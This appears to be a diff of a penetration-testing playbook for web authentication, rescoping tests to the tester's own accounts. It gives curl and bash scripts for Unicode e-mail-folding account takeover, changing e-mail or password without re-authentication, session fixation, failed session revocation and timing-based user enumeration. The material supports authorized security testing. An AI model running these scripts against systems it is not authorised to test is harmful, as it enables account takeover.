 - **Test:** list the users of our tenant and look for ones we did not create. Create two members and find how
   their first password comes into being: returned in the response, mailed, or never shown. If it is never
-  shown, try at most 15 derivable values on our own new member. Repeat in the second tenant we own to tell a
-  per-tenant secret from a product-wide one.
+  shown, try at most 15 derivable values on our own new member. Repeat in B's tenant, when we hold one, to
+  tell a per-tenant secret from a product-wide one.
 - **How:**
   ```bash
   D="$E/evidence/$H/AUT-011"; mkdir -p "$D"; CT='Content-Type: application/json'
@@ -668,8 +681,8 @@ usually excluded).
 
 | | |
 |---|---|
-| **Severity** | High standalone when the variant gains access to B's existing account; Low when it only creates a duplicate or look-alike account |
-| **Requires** | signup, two-accounts |
+| **Severity** | High standalone when the variant gains access to the existing account; Low when it only creates a duplicate or look-alike account |
+| **Requires** | signup, account |
 | **Excluded by** | — |
 | **Unit** | deployment |
 | **Cost** | medium |
@@ -680,15 +693,17 @@ usually excluded).
   invitation acceptance, SSO linking. The bug is two of them disagreeing: the application compares bytes, the
   database collation folds case, accents and trailing spaces, a normaliser applies NFKC or lower-casing, the
   column truncates.
-- **Test:** B is registered. Register spellings that a second component may fold into B's address: case
-  changes, leading and trailing whitespace, a null byte or newline, a trailing dot, a Unicode character that
-  case-folds to ASCII (dotless i, Kelvin sign, long s, full-width letters), an overlong value that is
-  truncated. Sign-up must answer "already registered" for each. If one is accepted, check whether B's original
-  spelling now logs in with the attacker's password, and where the reset mail for the variant goes.
+- **Test:** our own account already exists and plays the victim. Register spellings that a second component may
+  fold into its address: case changes, leading and trailing whitespace, a null byte or newline, a trailing
+  dot, a Unicode character that case-folds to ASCII (dotless i, Kelvin sign, long s, full-width letters), an
+  overlong value that is truncated. Sign-up must answer "already registered" for each. If one is accepted,
+  check whether the original spelling now logs in with the attacker's password, and where the reset mail for
+  the variant goes.
 - **How:**
   ```bash
-  EB='<B e-mail, already registered>'; P='Aut012-variant-pw!'; D="$E/evidence/$H/AUT-012"; mkdir -p "$D"; CT='Content-Type: application/json'
-  python3 - "$EB" "$P" "$D" <<'PY'
+  EV='<e-mail of our own account, already registered>'; P='Aut012-variant-pw!'
+  D="$E/evidence/$H/AUT-012"; mkdir -p "$D"; CT='Content-Type: application/json'
+  python3 - "$EV" "$P" "$D" <<'PY'
   import sys, json
   e, p, d = sys.argv[1:4]; l, m = e.rsplit('@', 1)
   fold = {'i': 'ı', 'k': 'K', 's': 'ſ', 'a': 'ａ', 'e': 'ｅ'}   # dotless i, Kelvin sign, long s, full-width
@@ -699,23 +714,23 @@ usually excluded).
   PY
   for f in "$D"/*.json; do n=$(basename "$f" .json); printf '%-8s ' "$n"
     curl -sS "${HDR[@]}" -o "$D/reg-$n.body" -w '%{http_code} %{size_download}\n' -X POST "$T/api/signup" -H "$CT" --data-binary "@$f"; sleep 2; done
-  # after any accepted variant: does B's own spelling now open with the attacker's password, and whose profile is it?
-  curl -sS "${HDR[@]}" -c "$D/b.jar" -o "$D/login-b.body" -w 'B spelling + attacker password: %{http_code}\n' -X POST "$T/api/login" -H "$CT" \
-    -d "{\"email\":\"$EB\",\"password\":\"$P\"}"; curl -sS "${HDR[@]}" -b "$D/b.jar" "$T/api/me" | head -c 300
+  # after any accepted variant: does the original spelling now open with the attacker's password, and whose profile is it?
+  curl -sS "${HDR[@]}" -c "$D/v.jar" -o "$D/login-v.body" -w 'original spelling + attacker password: %{http_code}\n' -X POST "$T/api/login" -H "$CT" \
+    -d "{\"email\":\"$EV\",\"password\":\"$P\"}"; curl -sS "${HDR[@]}" -b "$D/v.jar" "$T/api/me" | head -c 300
   # and the reset for the accepted variant: which mailbox receives it, whose account does the link reset?
   curl -sS "${HDR[@]}" -o /dev/null -w 'reset for variant: %{http_code}\n' -X POST "$T/password/reset" -H "$CT" --data-binary "@$D/<accepted variant>.json"
   ```
   `00-same` is the control and must be refused. The Unicode and reset parts need a mailbox that receives the
   variant (a catch-all domain of ours); without one, test the register-then-login half only.
-- **Proof:** B exists first; the attacker's sign-up or reset with variant V; then a session whose profile call
-  returns B's user id, obtained with the attacker's password or through a mail only the attacker reads. B is
-  our own account.
+- **Proof:** the account existing first; the attacker's sign-up or reset with variant V; then a session whose
+  profile call returns the existing account's user id, obtained with the attacker's password or through a mail
+  only the attacker reads. The account is ours.
 - **Not a finding when:** the variant becomes a separate account with its own id and data: a look-alike
   duplicate is low or informative. Case is folded the same way everywhere. Plus and dot variants that reach
   one Gmail mailbox are distinct accounts by design (trial abuse is BIZ). The variant is rejected by
   validation. The account "taken" was an unverified one we created ourselves a minute earlier.
 - **Escalate:** the same disagreement in invitation acceptance or SSO e-mail matching hands over tenant access
-  (OAU chapter, BAC chapter). A variant that inherits B's verified flag feeds AUT-014. Display-only
+  (OAU chapter, BAC chapter). A variant that inherits the verified flag feeds AUT-014. Display-only
   impersonation with homoglyph names is graveyard unless staff act on it.
 
 ### AUT-013 · An account pre-registered with an unverified e-mail stays in the attacker's hands after the owner signs in with SSO
@@ -798,6 +813,7 @@ usually excluded).
   curl -sS "${HDR[@]}" -o "$D/ropc.body" -w 'token for unverified account: %{http_code}\n' -X POST "$T/oauth/token" -d grant_type=password \
     --data-urlencode 'username=<unverified account>' --data-urlencode 'password=<its password>'
   ```
+  Put A's original address back afterwards.
 - **Proof:** account A showing Y as its verified address (API field or settings page) with no mail to Y opened,
   and the consequence: A joined the organisation that auto-admits Y's domain, accepted an invitation addressed
   to Y, or received a `userinfo` response asserting Y as verified. Y is ours.
@@ -825,24 +841,27 @@ usually excluded).
 - **Where:** change e-mail, change password, set a password on an SSO-only account, add a recovery e-mail or
   phone, change the login name; the same actions on the mobile and older API versions, which often lack the
   `current_password` field.
-- **Test:** with B's session and nothing else, send each change without the current password, with it empty,
-  and with it wrong. For the e-mail change also note who has to confirm: only the new address, or the old one
-  too. Then finish as the attacker would: reset the password through the new address.
-- **How:** B's session stands for a session the attacker rides or borrowed; N is a third address of ours.
+- **Test:** with a session of the account and nothing else, send each change without the current password,
+  with it empty, and with it wrong. For the e-mail change also note who has to confirm: only the new address,
+  or the old one too. Then finish as the attacker would: reset the password through the new address.
+- **How:** the session stands for one the attacker rides or borrowed; N is another address of ours.
   ```bash
-  N='<third address of ours>'; D="$E/evidence/$H/AUT-015"; mkdir -p "$D"; CT='Content-Type: application/json'
-  st(){ curl -sS "${HDR[@]}" $B "$T/api/me" | grep -oE '"(email|pending_email|unconfirmed_email)":"[^"]*"' | tr '\n' ' '; echo; }
+  S=$B    # the ridden session: B's, or $A when we hold one account (then update its saved login afterwards)
+  EV='<e-mail of that account>'; N='<another address of ours>'; D="$E/evidence/$H/AUT-015"; mkdir -p "$D"; CT='Content-Type: application/json'
+  st(){ curl -sS "${HDR[@]}" $S "$T/api/me" | grep -oE '"(email|pending_email|unconfirmed_email)":"[^"]*"' | tr '\n' ' '; echo; }
+  st
   for b in "{\"email\":\"$N\"}" "{\"email\":\"$N\",\"current_password\":\"\"}" "{\"email\":\"$N\",\"current_password\":\"wrong-Aut015\"}"; do
-    curl -sS "${HDR[@]}" $B -o "$D/email.body" -w "%{http_code} $b -> " -X PATCH "$T/api/account" -H "$CT" -d "$b"; st; sleep 1; done
+    curl -sS "${HDR[@]}" $S -o "$D/email.body" -w "%{http_code} $b -> " -X PATCH "$T/api/account" -H "$CT" -d "$b"; st; sleep 1; done
   for b in '{"new_password":"Aut015-new-pw!"}' '{"new_password":"Aut015-new-pw!","old_password":""}' '{"new_password":"Aut015-new-pw!","old_password":"wrong-Aut015"}'; do
-    curl -sS "${HDR[@]}" $B -o "$D/pw.body" -w "%{http_code} $b\n" -X POST "$T/api/account/password" -H "$CT" -d "$b"; sleep 1; done
-  curl -sS "${HDR[@]}" -o /dev/null -w 'login with the new password: %{http_code}\n' -X POST "$T/api/login" -H "$CT" -d '{"email":"<B e-mail>","password":"Aut015-new-pw!"}'
-  # if the address moved: reset through N and log in
+    curl -sS "${HDR[@]}" $S -o "$D/pw.body" -w "%{http_code} $b\n" -X POST "$T/api/account/password" -H "$CT" -d "$b"; sleep 1; done
+  for e in "$EV" "$N"; do curl -sS "${HDR[@]}" -o /dev/null -w "login as $e with the new password: %{http_code}\n" -X POST "$T/api/login" \
+    -H "$CT" -d "{\"email\":\"$e\",\"password\":\"Aut015-new-pw!\"}"; done
+  # if the address moved and the password did not: reset through N, which only the attacker reads
   curl -sS "${HDR[@]}" -o /dev/null -w 'reset to N: %{http_code}\n' -X POST "$T/password/reset" -H "$CT" -d "{\"email\":\"$N\"}"
   ```
-- **Proof:** starting from B's session only: the address switched to N with no password asked and no approval
-  from the old address, a reset mail arriving at N, a new password set, and B's original address and password
-  no longer logging in. Or the password replaced directly. All three addresses are ours.
+- **Proof:** starting from the session only: the address switched to N with no password asked and no approval
+  from the old address, a reset mail arriving at N, a new password set, and the original address and password
+  no longer logging in. Or the password replaced directly. Account and addresses are ours.
 - **Not a finding when:** the change stays pending until a link sent to the old address is clicked. The session
   authenticated moments ago and the product has a re-authentication window: repeat with an older session. The
   account is SSO-only and has no password to ask for. Alone, this is often closed as informative because the
@@ -876,9 +895,9 @@ usually excluded).
   D="$E/evidence/$H/AUT-016"; mkdir -p "$D"; J="$D/jar"
   ck(){ sed 's/^#HttpOnly_//' "$1" | grep -v '^#' | awk 'NF>=7{print $6"="$7}' | sort; }
   curl -sS "${HDR[@]}" -c "$J" -o "$D/login.html" "$T/login"; cp "$J" "$D/pre.jar"; ck "$D/pre.jar"
-  # log in with that jar: field names and any CSRF token come from $D/login.html
+  # log in with that jar as our own account: field names and any CSRF token come from $D/login.html
   curl -sS "${HDR[@]}" -b "$J" -c "$J" -o /dev/null -w 'login %{http_code}\n' -X POST "$T/login" \
-    --data-urlencode 'email=<B e-mail>' --data-urlencode 'password=<B password>'
+    --data-urlencode 'email=<e-mail of our own account>' --data-urlencode 'password=<its password>'
   diff <(ck "$D/pre.jar") <(ck "$J") && echo 'no cookie changed at login'
   # the attacker's copy of the pre-login cookies, never used to log in:
   curl -sS "${HDR[@]}" -b "$D/pre.jar" -o "$D/me-with-pre.body" -w 'pre-login cookies now: %{http_code}\n' "$T/api/me"
@@ -886,9 +905,9 @@ usually excluded).
   curl -sS "${HDR[@]}" -b '<session cookie name>=aut016fixed00000000000000000000' -c "$D/adopt.jar" -o /dev/null "$T/login"; ck "$D/adopt.jar"
   curl -sS "${HDR[@]}" -o /dev/null -w 'url session: %{http_code}\n' "$T/account;jsessionid=<value from pre.jar>"
   ```
-- **Proof:** the pre-login value V held by the "attacker" client, B logging in from a client that carries V, and
-  the attacker's profile call with V returning B's data. For a reportable finding add the delivery step that
-  puts V into the victim's browser.
+- **Proof:** the pre-login value V held by the "attacker" client, our account logging in from a client that
+  carries V, and the attacker's profile call with V returning that account's data. For a reportable finding add
+  the delivery step that puts V into the victim's browser.
 - **Not a finding when:** login issues a new value and the old one is unauthenticated. The cookie that stayed
   the same does not carry authentication (CSRF token, load-balancer affinity, analytics, a cart id). The server
   accepts an invented identifier before login but replaces it at login. With no way to plant the cookie, most
@@ -917,18 +936,19 @@ usually excluded).
 - **Test:** keep a copy of each credential, fire the event from another session, replay the copy on an endpoint
   that returns private data. Wait two minutes and replay once more before concluding, in case revocation
   propagates through a cache.
-- **How:** on our own account B.
+- **How:** on our own account; B when we hold two, because the password changes.
   ```bash
-  D="$E/evidence/$H/AUT-017"; mkdir -p "$D"; CT='Content-Type: application/json'; SC='<session cookie name>'
-  li(){ curl -sS "${HDR[@]}" -c "$1" -o /dev/null -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"<B e-mail>\",\"password\":\"$2\",\"remember_me\":true}"; }
+  EV='<e-mail of our own account under test>'; PV='<its password>'; SC='<session cookie name>'
+  D="$E/evidence/$H/AUT-017"; mkdir -p "$D"; CT='Content-Type: application/json'
+  li(){ curl -sS "${HDR[@]}" -c "$1" -o /dev/null -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$2\",\"remember_me\":true}"; }
   ok(){ printf '%-28s %s\n' "$2" "$(curl -sS "${HDR[@]}" -b "$1" -o /dev/null -w '%{http_code}' "$T/api/me")"; }
-  li "$D/s1" '<B password>'; li "$D/s2" '<B password>'; cp "$D/s1" "$D/s1.copy"
+  li "$D/s1" "$PV"; li "$D/s2" "$PV"; cp "$D/s1" "$D/s1.copy"
   grep -v "$SC" "$D/s2" > "$D/s2.remember"                      # remember-me cookie without the session cookie
   ok "$D/s1" s1-live; ok "$D/s2" s2-live; ok "$D/s2.remember" remember-live
   curl -sS "${HDR[@]}" -b "$D/s1" -c "$D/s1" -o /dev/null -X POST "$T/api/logout"; ok "$D/s1.copy" s1-after-logout
-  li "$D/s3" '<B password>'
+  li "$D/s3" "$PV"
   curl -sS "${HDR[@]}" -b "$D/s3" -o /dev/null -w 'password change %{http_code}\n' -X POST "$T/api/account/password" -H "$CT" \
-    -d '{"old_password":"<B password>","new_password":"Aut017-new-pw!"}'
+    -d "{\"old_password\":\"$PV\",\"new_password\":\"Aut017-new-pw!\"}"
   ok "$D/s2" s2-after-pw-change; ok "$D/s2.remember" remember-after-pw-change
   li "$D/s4" 'Aut017-new-pw!'; li "$D/s5" 'Aut017-new-pw!'
   curl -sS "${HDR[@]}" -b "$D/s4" -o /dev/null -w 'sign out everywhere %{http_code}\n' -X POST "$T/api/sessions/revoke_all"
@@ -936,9 +956,9 @@ usually excluded).
   curl -sS "${HDR[@]}" -H 'Authorization: Bearer <API key created before the events>' -o /dev/null -w 'api key after all events: %{http_code}\n' "$T/api/me"
   sleep 120; ok "$D/s5" s5-two-minutes-later
   ```
-- **Proof:** the revoking request shown succeeding, then the old credential returning B's private data, with
-  timestamps, twice two minutes apart. Name the event precisely: the report is about that event not doing what
-  it says.
+- **Proof:** the revoking request shown succeeding, then the old credential returning the account's private
+  data, with timestamps, twice two minutes apart. Name the event precisely: the report is about that event not
+  doing what it says.
 - **Not a finding when:** the policy lists `session-expiry`, which most do; the planner closes the item. A
   short-lived JWT keeps working until its `exp` a few minutes away. Other sessions survive a password change in
   settings: many products keep them on purpose, and the same after a reset is the stronger case. Logout clears
@@ -979,7 +999,7 @@ usually excluded).
   pr avail-reg   "$T/api/signup/check"    "{\"email\":\"$R\"}"
   pr avail-unreg "$T/api/signup/check"    "{\"email\":\"$N\"}"
   sha256sum "$D"/*.body; diff "$D/login-reg.body" "$D/login-unreg.body"; diff "$D/reset-reg.body" "$D/reset-unreg.body"
-  # timing: six samples each (more would trip a lockout on our own account), medians compared
+  # timing: six samples each (more would trip a lockout on our own account), the two middle values of each compared
   for id in "$R" "$N"; do for i in $(seq 1 6); do curl -sS "${HDR[@]}" -o /dev/null -w '%{time_total}\n' -X POST "$T/api/login" -H "$CT" \
     -d "{\"email\":\"$id\",\"password\":\"wrong-Aut018\"}"; sleep 2; done | sort -n | sed -n '3p;4p' | tr '\n' ' '; echo " <- $id"; done
   ```
@@ -1025,8 +1045,8 @@ usually excluded).
 - **Reset by convincing support staff** (`social-engineering`); **reset link read on an unlocked device or off
   the wire** (`physical`, `mitm`).
 - **Missing or bypassable captcha** with no consequence beyond more requests (`rate-limit`).
-- **Scanner output: "password field submitted over a form with autocomplete", "session cookie scoped to parent
-  domain"** (`automated`).
+- **Scanner output: "password field with autocomplete", "session cookie scoped to parent domain"**
+  (`automated`).
 
 ## Chains
 
